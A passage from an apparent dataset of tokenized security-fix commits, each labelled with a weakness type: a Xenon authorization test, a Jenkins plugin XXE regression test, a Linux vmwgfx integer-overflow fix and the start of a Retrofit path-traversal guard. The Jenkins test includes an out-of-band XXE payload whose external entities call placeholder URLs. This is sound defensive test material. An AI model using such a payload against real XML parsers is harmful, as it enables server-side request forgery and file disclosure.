"(", "new", "AuthorizationContextService", "(", "))", ";", "host", ".", "setAuthorizationEnabled", "(", "true", ")", ";", "host", ".", "setMaintenanceIntervalMicros", "(", "TimeUnit", ".", "MILLISECONDS", ".", "toMicros", "(", "100", ")", ");", "host", ".", "start", "(", ");", "TestRequestSender", "sender", "=", "host", ".", "getTestRequestSender", "(", ");", "host", ".", "setSystemAuthorizationContext", "(", ");", "host", ".", "waitForReplicatedFactoryServiceAvailable", "(", "UriUtils", ".", "buildUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ");", "String", "exampleUser", "=", "\"", "example", "@", "vmware", ".", "com", "\"", ";", "String", "examplePass", "=", "\"", "password", "\"", ";", "TestContext", "authCtx", "=", "host", ".", "testCreate", "(", "1", ")", ";", "AuthorizationSetupHelper", ".", "create", "(", ")", ".", "setHost", "(", "host", ")", ".", "setUserEmail", "(", "exampleUser", ")", ".", "setUserPassword", "(", "examplePass", ")", ".", "setResourceQuery", "(", "Query", ".", "Builder", ".", "create", "(", ")", ".", "addFieldClause", "(", "ServiceDocument", ".", "FIELD_NAME_KIND", ",", "Utils", ".", "buildKind", "(", "ExampleServiceState", ".", "class", ")", ")", ".", "build", "(", "))", ".", "setCompletion", "(", "authCtx", ".", "getCompletion", "(", "))", ".", "start", "(", ");", "authCtx", ".", "await", "(", ");", "/", "/", "create", "a", "sample", "service", "ExampleServiceState", "doc", "=", "new", "ExampleServiceState", "(", ");", "doc", ".", "name", "=", "\"", "foo", "\"", ";", "doc", ".", "documentSelfLink", "=", "\"", "foo", "\"", ";", "Operation", "post", "=", "Operation", ".", "createPost", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ".", "setBody", "(", "doc", ")", ";", "ExampleServiceState", "postResult", "=", "sender", ".", "sendAndWait", "(", "post", ",", "ExampleServiceState", ".", "class", ")", ";", "host", ".", "resetAuthorizationContext", "(", ");", "URI", "factoryAvailableUri", "=", "UriUtils", ".", "buildAvailableUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ";", "URI", "factoryStatsUri", "=", "UriUtils", ".", "buildStatsUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ";", "URI", "factoryConfigUri", "=", "UriUtils", ".", "buildConfigUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ";", "URI", "factorySubscriptionUri", "=", "UriUtils", ".", "buildSubscriptionUri", "(", "host", ",", "ExampleService", ".", "FACTORY_LINK", ")", ";", "URI", "factoryTemplateUri", "=", "UriUtils", ".", "buildUri", "(", "host", ",", "UriUtils", ".", "buildUriPath", "(", "ExampleService", ".", "FACTORY_LINK", ",", "SERVICE_URI_SUFFIX_TEMPLATE", ")", ");", "URI", "factoryUiUri", "=", "UriUtils", ".", "buildUri", "(", "host", ",", "UriUtils", ".", "buildUriPath", "(", "ExampleService", ".", "FACTORY_LINK", ",", "SERVICE_URI_SUFFIX_UI", ")", ");", "URI", "serviceAvailableUri", "=", "UriUtils", ".", "buildAvailableUri", "(", "host", ",", "postResult", ".", "documentSelfLink", ")", ";", "URI", "serviceStatsUri", "=", "UriUtils", ".", "buildStatsUri", "(", "host", ",", "postResult", ".", "documentSelfLink", ")", ";", "URI", "serviceConfigUri", "=", "UriUtils", ".", "buildConfigUri", "(", "host", ",", "postResult", ".", "documentSelfLink", ")", ";", "URI", "serviceSubscriptionUri", "=", "UriUtils", ".", "buildSubscriptionUri", "(", "host", ",", "postResult", ".", "documentSelfLink", ")", ";", "URI", "serviceTemplateUri", "=", "UriUtils", ".", "buildUri", "(", "host", ",", "UriUtils", ".", "buildUriPath", "(", "postResult", ".", "documentSelfLink", ",", "SERVICE_URI_SUFFIX_TEMPLATE", ")", ");", "URI", "serviceUiUri", "=", "UriUtils", ".", "buildUri", "(", "host", ",", "UriUtils", ".", "buildUriPath", "(", "postResult", ".", "documentSelfLink", ",", "SERVICE_URI_SUFFIX_UI", ")", ");", "/", "/", "check", "non", "-", "authenticated", "user", "receives", "forbidden", "response", "FailureResponse", "failureResponse", ";", "Operation", "uiOpResult", ";", "/", "/", "check", "factory", "endpoints", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factoryAvailableUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factoryStatsUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factoryConfigUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factorySubscriptionUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "factoryTemplateUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "uiOpResult", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryUiUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "uiOpResult", ".", "getStatusCode", "(", "))", ";", "/", "/", "check", "service", "endpoints", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceAvailableUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceStatsUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceConfigUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceSubscriptionUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "failureResponse", "=", "sender", ".", "sendAndWaitFailure", "(", "Operation", ".", "createGet", "(", "serviceTemplateUri", ")", ");", "assertEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "failureResponse", ".", "op", ".", "getStatusCode", "(", "))", ";", "uiOpResult", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceUiUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "uiOpResult", ".", "getStatusCode", "(", "))", ";", "/", "/", "check", "authenticated", "user", "does", "NOT", "receive", "forbidden", "response", "AuthTestUtils", ".", "login", "(", "host", ",", "exampleUser", ",", "examplePass", ")", ";", "Operation", "response", ";", "/", "/", "check", "factory", "endpoints", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryAvailableUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryStatsUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryConfigUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factorySubscriptionUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryTemplateUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "factoryUiUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "/", "/", "check", "service", "endpoints", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceAvailableUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceStatsUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceConfigUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceSubscriptionUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceTemplateUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "response", "=", "sender", ".", "sendAndWait", "(", "Operation", ".", "createGet", "(", "serviceUiUri", ")", ");", "assertNotEquals", "(", "Operation", ".", "STATUS_CODE_FORBIDDEN", ",", "response", ".", "getStatusCode", "(", "))", ";", "}", "}", "@", "@", "-", "30", ",", "6", "+", "30", ",", "7", "@", "@", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "ServiceHost", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "UriUtils", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Utils", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ExampleService", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "ExampleService", ".", "ExampleServiceState", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "QueryTask", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "services", ".", "common", ".", "QueryTask", ".", "Query", ";", "@", "@", "-", "269", ",", "6", "+", "270", ",", "22", "@", "@", "public", "String", "getUserGroupName", "(", "String", "email", ")", "{", "UriUtils", ".", "buildUriPath", "(", "ServiceUriPaths", ".", "CORE_AUTHZ_USERS", ",", "email", ")", ")", ".", "build", "(", "))", ";", "/", "/", "Create", "resource", "group", "to", "allow", "access", "on", "utility", "paths", "String", "statsResourceGroupLink", "=", "createResourceGroup", "(", "target", ",", "\"", "stats", "-", "resource", "-", "group", "\"", ",", "Builder", ".", "create", "(", ")", ".", "addFieldClause", "(", "ServiceDocument", ".", "FIELD_NAME_SELF_LINK", ",", "ExampleService", ".", "FACTORY_LINK", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_STATS", ")", ".", "build", "(", "))", ";", "String", "subscriptionsResourceGroupLink", "=", "createResourceGroup", "(", "target", ",", "\"", "subs", "-", "resource", "-", "group", "\"", ",", "Builder", ".", "create", "(", ")", ".", "addFieldClause", "(", "ServiceDocument", ".", "FIELD_NAME_SELF_LINK", ",", "ServiceUriPaths", ".", "CORE_LOCAL_QUERY_TASKS", "+", "ServiceHost", ".", "SERVICE_URI_SUFFIX_SUBSCRIPTIONS", ")", ".", "build", "(", "))", ";", "Collection", "<", "String", ">", "paths", "=", "new", "HashSet", "<", ">(", ");", "/", "/", "Create", "roles", "tying", "these", "together", "@", "@", "-", "283", ",", "6", "+", "300", ",", "16", "@", "@", "public", "String", "getUserGroupName", "(", "String", "email", ")", "{", "/", "/", "Create", "role", "authorizing", "access", "to", "the", "user", "'", "s", "own", "query", "tasks", "paths", ".", "add", "(", "createRole", "(", "target", ",", "userGroupLink", ",", "queryTaskResourceGroupLink", ",", "new", "HashSet", "<", ">(", "Arrays", ".", "asList", "(", "Action", ".", "GET", ",", "Action", ".", "POST", ",", "Action", ".", "PATCH", ",", "Action", ".", "DELETE", ")", "))", ");", "/", "/", "Create", "role", "authorizing", "access", "to", "/", "stats", "paths", ".", "add", "(", "createRole", "(", "target", ",", "userGroupLink", ",", "statsResourceGroupLink", ",", "new", "HashSet", "<", ">(", "Arrays", ".", "asList", "(", "Action", ".", "GET", ",", "Action", ".", "POST", ",", "Action", ".", "PATCH", ",", "Action", ".", "DELETE", ")", "))", ");", "/", "/", "Create", "role", "authorizing", "access", "to", "/", "subscriptions", "of", "query", "tasks", "paths", ".", "add", "(", "createRole", "(", "target", ",", "userGroupLink", ",", "subscriptionsResourceGroupLink", ",", "new", "HashSet", "<", ">(", "Arrays", ".", "asList", "(", "Action", ".", "GET", ",", "Action", ".", "POST", ",", "Action", ".", "PATCH", ",", "Action", ".", "DELETE", ")", "))", ");", "return", "paths", ";", "}", "@", "@", "-", "79", ",", "6", "+", "79", ",", "7", "@", "@", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Operation", ".", "AuthorizationContext", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Operation", ".", "CompletionHandler", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Operation", ".", "OperationOption", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "OperationContext", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Service", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Service", ".", "Action", ";", "import", "com", ".", "vmware", ".", "xenon", ".", "common", ".", "Service", ".", "ServiceOption", ";", "@", "@", "-", "1011", ",", "8", "+", "1012", ",", "16", "@", "@", "public", "ServiceDocumentQueryResult", "getExpandedFactoryState", "(", "URI", "factoryUri", ")", "{", "}", "public", "Map", "<", "String", ",", "ServiceStat", ">", "getServiceStats", "(", "URI", "serviceUri", ")", "{", "AuthorizationContext", "ctx", "=", "null", ";", "if", "(", "this", ".", "isAuthorizationEnabled", "(", "))", "{", "ctx", "=", "OperationContext", ".", "getAuthorizationContext", "(", ");", "this", ".", "setSystemAuthorizationContext", "(", ");", "}", "ServiceStats", "stats", "=", "this", ".", "getServiceState", "(", "null", ",", "ServiceStats", ".", "class", ",", "UriUtils", ".", "buildStatsUri", "(", "serviceUri", ")", ");", "if", "(", "this", ".", "isAuthorizationEnabled", "(", "))", "{", "this", ".", "setAuthorizationContext", "(", "ctx", ")", ";", "}", "return", "stats", ".", "entries", ";", "}", "@", "@", "-", "2482", ",", "6", "+", "2482", ",", "7", "@", "@", "public", "void", "replicationWithAuthzCacheClear", "(", ")", "throws", "Throwable", "{", "VerificationHost", "groupHost", "=", "this", ".", "host", ".", "getPeerHost", "(", ");", "groupHost", ".", "setSystemAuthorizationContext", "(", ");", "/", "/", "wait", "for", "auth", "related", "services", "to", "be", "stabilized", "groupHost", ".", "waitForReplicatedFactoryServiceAvailable", "(", "UriUtils", ".", "buildUri", "(", "groupHost", ",", "UserService", ".", "FACTORY_LINK", ")", ");", "@", "@", "-", "2499", ",", "7", "+", "2500", ",", "7", "@", "@", "public", "void", "replicationWithAuthzCacheClear", "(", ")", "throws", "Throwable", "{", "String", "bazUserLink", "=", "UriUtils", ".", "buildUriPath", "(", "ServiceUriPaths", ".", "CORE_AUTHZ_USERS", ",", "\"", "baz", "@", "vmware", ".", "com", "\"", ");", "groupHost", ".", "setSystemAuthorizationContext", "(", ");", "/", "/", "create", "user", ",", "user", "-", "group", ",", "resource", "-", "group", ",", "role", "for", "foo", "@", "vmware", ".", "com", "/", "/", "user", ":", "/", "core", "/", "authz", "/", "users", "/", "foo", "@", "vmware", ".", "com", "@", "@", "-", "2709", ",", "7", "+", "2710", ",", "7", "@", "@", "private", "void", "populateAuthCacheInAllPeers", "(", "AuthorizationContext", "authContext", ")", "throw", "/", "/", "based", "on", "the", "role", "created", "in", "test", ",", "all", "users", "have", "access", "to", "ExampleService", "this", ".", "host", ".", "sendAndWaitExpectSuccess", "(", "Operation", ".", "createGet", "(", "UriUtils", ".", "buildStatsUri", "(", "peer", ",", "ExampleService", ".", "FACTORY_LINK", ")", "))", ";", "Operation", ".", "createGet", "(", "UriUtils", ".", "buildUri", "(", "peer", ",", "ExampleService", ".", "FACTORY_LINK", ")", "))", ";", "}", "this", ".", "host", ".", "waitFor", "(", "\"", "Timeout", "waiting", "for", "correct", "auth", "cache", "state", "\"", ","], "docstring_tokens": ["information", "disclosure"]}
{"contents": ["Merge", "pull", "request", "#13", "from", "Wadeck/SECURITY-656_ADD_TEST", "[SECURITY-656]", "Add", "test", "for", "the", "XXE", "correction"], "code_tokens": ["@", "@", "-", "0", ",", "0", "+", "1", ",", "144", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2018", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "plugins", ".", "checkstyle", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "Launcher", ";", "import", "hudson", ".", "model", ".", "AbstractBuild", ";", "import", "hudson", ".", "model", ".", "AbstractProject", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "hudson", ".", "model", ".", "FreeStyleProject", ";", "import", "hudson", ".", "model", ".", "Result", ";", "import", "hudson", ".", "model", ".", "UnprotectedRootAction", ";", "import", "hudson", ".", "tasks", ".", "BuildStepDescriptor", ";", "import", "hudson", ".", "tasks", ".", "Builder", ";", "import", "hudson", ".", "tasks", ".", "Shell", ";", "import", "hudson", ".", "util", ".", "HttpResponses", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "FileUtils", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Issue", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "TestExtension", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "HttpResponse", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "/", "**", "*", "Tests", "the", "extraction", "of", "CheckStyle", "analysis", "results", ".", "*", "/", "public", "class", "CheckStylePublisherTest", "{", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "656", "\"", ")", "public", "void", "testXxe", "(", ")", "throws", "Exception", "{", "String", "oobInUserContentLink", "=", "j", ".", "getURL", "(", ")", "+", "\"", "userContent", "/", "oob", ".", "xml", "\"", ";", "String", "triggerLink", "=", "j", ".", "getURL", "(", ")", "+", "\"", "triggerMe", "\"", ";", "String", "xxeFile", "=", "this", ".", "getClass", "(", ").", "getResource", "(", "\"", "testXxe", "-", "xxe", ".", "xml", "\"", ").", "getFile", "(", ");", "String", "xxeFileContent", "=", "FileUtils", ".", "readFileToString", "(", "new", "File", "(", "xxeFile", ")", ",", "StandardCharsets", ".", "UTF_8", ")", ";", "String", "adaptedXxeFileContent", "=", "xxeFileContent", ".", "replace", "(", "\"$", "OOB_LINK", "$", "\",", "oobInUserContentLink", ")", ";", "String", "oobFile", "=", "this", ".", "getClass", "(", ").", "getResource", "(", "\"", "testXxe", "-", "oob", ".", "xml", "\"", ").", "getFile", "(", ");", "String", "oobFileContent", "=", "FileUtils", ".", "readFileToString", "(", "new", "File", "(", "oobFile", ")", ",", "StandardCharsets", ".", "UTF_8", ")", ";", "String", "adaptedOobFileContent", "=", "oobFileContent", ".", "replace", "(", "\"$", "TARGET_URL", "$", "\",", "triggerLink", ")", ";", "File", "userContentDir", "=", "new", "File", "(", "j", ".", "jenkins", ".", "getRootDir", "(", "),", "\"", "userContent", "\"", ");", "FileUtils", ".", "writeStringToFile", "(", "new", "File", "(", "userContentDir", ",", "\"", "oob", ".", "xml", "\"", "),", "adaptedOobFileContent", ")", ";", "FreeStyleProject", "project", "=", "j", ".", "createFreeStyleProject", "(", ");", "DownloadBuilder", "builder", "=", "new", "DownloadBuilder", "(", ");", "builder", ".", "fileContent", "=", "adaptedXxeFileContent", ";", "project", ".", "getBuildersList", "(", ").", "add", "(", "builder", ")", ";", "CheckStylePublisher", "publisher", "=", "new", "CheckStylePublisher", "(", ");", "publisher", ".", "setPattern", "(", "\"", "xxe", ".", "xml", "\"", ");", "project", ".", "getPublishersList", "(", ").", "add", "(", "publisher", ")", ";", "assertEquals", "(", "Result", ".", "SUCCESS", ",", "project", ".", "scheduleBuild2", "(", "0", ")", ".", "get", "(", ").", "getResult", "(", "))", ";", "YouCannotTriggerMe", "urlHandler", "=", "j", ".", "jenkins", ".", "getExtensionList", "(", "UnprotectedRootAction", ".", "class", ")", ".", "get", "(", "YouCannotTriggerMe", ".", "class", ")", ";", "assertEquals", "(", "0", ",", "urlHandler", ".", "triggerCount", ")", ";", "}", "public", "static", "class", "DownloadBuilder", "extends", "Builder", "{", "String", "fileContent", ";", "@", "Override", "public", "boolean", "perform", "(", "AbstractBuild", "<", "?,", "?", ">", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", "{", "try", "{", "FileUtils", ".", "writeStringToFile", "(", "new", "File", "(", "build", ".", "getWorkspace", "(", ").", "getRemote", "(", "),", "\"", "xxe", ".", "xml", "\"", "),", "fileContent", ")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "return", "false", ";", "}", "return", "true", ";", "}", "@", "Extension", "public", "static", "class", "DescriptorImpl", "extends", "BuildStepDescriptor", "<", "Builder", ">", "{", "@", "Override", "public", "boolean", "isApplicable", "(", "Class", "<", "?", "extends", "AbstractProject", ">", "jobType", ")", "{", "return", "true", ";", "}", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "null", ";", "}", "}", "}", "@", "TestExtension", "(", "\"", "testXxe", "\"", ")", "public", "static", "class", "YouCannotTriggerMe", "implements", "UnprotectedRootAction", "{", "private", "int", "triggerCount", "=", "0", ";", "@", "Override", "public", "String", "getIconFileName", "(", ")", "{", "return", "null", ";", "}", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "null", ";", "}", "@", "Override", "public", "String", "getUrlName", "(", ")", "{", "return", "\"", "triggerMe", "\"", ";", "}", "public", "HttpResponse", "doIndex", "(", ")", "{", "triggerCount", "+", "+;", "return", "HttpResponses", ".", "plainText", "(", "\"", "triggered", "\"", ");", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", "@", "@", "<", "!", "ENTITY", "%", "param1", "\"", "<!", "ENTITY", "oob", "SYSTEM", "'", "$", "TARGET_URL", "$", "'>", "\">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "12", "@", "@", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "ISO", "-", "8859", "-", "1", "\"", "?>", "<", "!", "DOCTYPE", "r", "[", "<", "!", "ELEMENT", "r", "ANY", ">", "<", "!", "ENTITY", "%", "sp", "SYSTEM", "\"", "$", "OOB_LINK", "$", "\">", "%", "sp", ";", "%", "param1", ";", "]", ">", "<", "r", ">", "&", "oob", ";", "</", "r", ">", "<", "xyz", "timestamp", "=", "\"", "2010", "-", "07", "-", "23T20", ":", "34", ":", "59", ".", "300", "\"", "version", "=", "\"", "4", ".", "2", ".", "5", "\"", ">", "<", "file", "name", "=", "\"", "doesntreallymatterwhatsinhere", "\"", ">", "<", "/", "file", ">", "<", "/", "xyz", ">"], "docstring_tokens": ["xml", "external", "entity", "(xxe", ")"]}
{"contents": ["drm/vmwgfx:", "fix", "integer", "overflow", "in", "vmw_surface_define_ioctl()", "In", "vmw_surface_define_ioctl(),", "the", "'num_sizes'", "is", "the", "sum", "of", "the", "'req->mip_levels'", "array.", "This", "array", "can", "be", "assigned", "any", "value", "from", "the", "user", "space.", "As", "both", "the", "'num_sizes'", "and", "the", "array", "is", "uint32_t,", "it", "is", "easy", "to", "make", "'num_sizes'", "overflow.", "The", "later", "'mip_levels'", "is", "used", "as", "the", "loop", "count.", "This", "can", "lead", "an", "oob", "write.", "Add", "the", "check", "of", "'req->mip_levels'", "to", "avoid", "this.", "Cc:", "<stable@vger.kernel.org>", "Signed-off-by:", "Li", "Qiang", "<liqiang6-s@360.cn>", "Reviewed-by:", "Thomas", "Hellstrom", "<thellstrom@vmware.com>"], "code_tokens": ["@", "@", "-", "713", ",", "8", "+", "713", ",", "11", "@", "@", "int", "vmw_surface_define_ioctl", "(", "struct", "drm_device", "*", "dev", ",", "void", "*", "data", ",", "128", ";", "num_sizes", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "DRM_VMW_MAX_SURFACE_FACES", ";", "+", "+", "i", ")", "for", "(", "i", "=", "0", ";", "i", "<", "DRM_VMW_MAX_SURFACE_FACES", ";", "+", "+", "i", ")", "{", "if", "(", "req", "-", ">", "mip_levels", "[", "i", "]", ">", "DRM_VMW_MAX_MIP_LEVELS", ")", "return", "-", "EINVAL", ";", "num_sizes", "+", "=", "req", "-", ">", "mip_levels", "[", "i", "]", ";", "}", "if", "(", "num_sizes", ">", "DRM_VMW_MAX_SURFACE_FACES", "*", "DRM_VMW_MAX_MIP_LEVELS", "|", "|", "num_sizes", "=", "=", "0", ")"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["Forbid", "path", "traversal", "('.'", "and", "'..')", "as", "@Path", "parameters.", "They're", "likely", "to", "have", "the", "unintended", "effect.", "For", "example,", "passing", "\"..\"", "to", "@DELETE", "/account/book/{isbn}/", "yields", "@DELETE", "/account/."], "code_tokens": ["@", "@", "-", "16", ",", "6", "+", "16", ",", "7", "@", "@", "package", "retrofit2", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "import", "javax", ".", "annotation", ".", "Nullable", ";", "import", "okhttp3", ".", "FormBody", ";", "import", "okhttp3", ".", "Headers", ";", "@", "@", "-", "32", ",", "6", "+", "33", ",", "21", "@", "@", "{", "'", "0", "'", ",", "'", "1", "'", ",", "'", "2", "'", ",", "'", "3", "'", ",", "'", "4", "'", ",", "'", "5", "'", ",", "'", "6", "'", ",", "'", "7", "'", ",", "'", "8", "'", ",", "'", "9", "'", ",", "'", "A", "'", ",", "'", "B", "'", ",", "'", "C", "'", ",", "'", "D", "'", ",", "'", "E", "'", ",", "'", "F", "'", "}", ";", "private", "static", "final", "String", "PATH_SEGMENT_ALWAYS_ENCODE_SET", "=", "\"", "\\", "\"<", ">^", "`{", "}|", "\\\\", "?#", "\";", "/", "**", "*", "Matches", "strings", "that", "contain", "{", "@", "code", ".", "}", "or", "{", "@", "code", ".", ".}", "as", "a", "complete", "path", "segment", 